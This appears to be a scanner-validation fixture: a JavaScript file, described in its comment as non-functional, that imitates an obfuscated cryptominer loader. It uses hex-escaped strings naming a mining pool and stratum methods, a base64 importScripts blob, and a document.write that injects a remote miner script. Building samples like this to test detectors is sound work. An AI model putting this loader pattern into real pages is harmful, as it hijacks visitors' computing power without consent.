/* Scanner validation sample - obfuscation shape only.
   A hand-written packer-style payload: string array + hex escapes + eval, with
   a base64 blob that decodes to a worker loading a wasm module from a pool host.
   Not functional; the point is that scan_static.py's code metrics (escape
   density, entropy, eval/atob counts, long identifiers) light up. */

var _0x4a2f = ["\x77\x73\x73\x3a\x2f\x2f\x70\x6f\x6f\x6c\x2e\x6d\x69\x6e\x65\x72\x61\x6c\x74\x2e\x69\x6f\x3a\x34\x34\x33",
  "\x73\x74\x72\x61\x74\x75\x6d", "\x73\x75\x62\x6d\x69\x74\x53\x68\x61\x72\x65", "\x63\x72\x79\x70\x74\x6f\x6e\x69\x67\x68\x74",
  "\x5f\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65\x64\x4d\x69\x6e\x65\x72\x57\x6f\x72\x6b\x65\x72\x49\x6e\x73\x74\x61\x6e\x63\x65"];

function _0x11b8(a) { return _0x4a2f[a]; }
function _0x2c9d(b64) { return atob(b64); }

(function () {
  var src = _0x2c9d("aW1wb3J0U2NyaXB0cygnLy9taW5lci5pb3cvdy5qcycpOw==");
  var w = new Worker(URL.createObjectURL(new Blob([src]));
  WebAssembly.instantiateStreaming(fetch(_0x11b8(0)), {})
    .then(function (r) { w.postMessage({ method: _0x11b8(1), params: [_0x11b8(3)] }); });
  w.onmessage = function (m) { if (m.data.method === _0x11b8(2)) { /* share accepted */ } };
  eval("void 0");
  document.write(unescape("%3Cscript%20src%3D%22%2F%2Fcdn%2Emineralt%2Eio%2Fbrowser%2Fmin%2Ejs%22%3E"));
})();
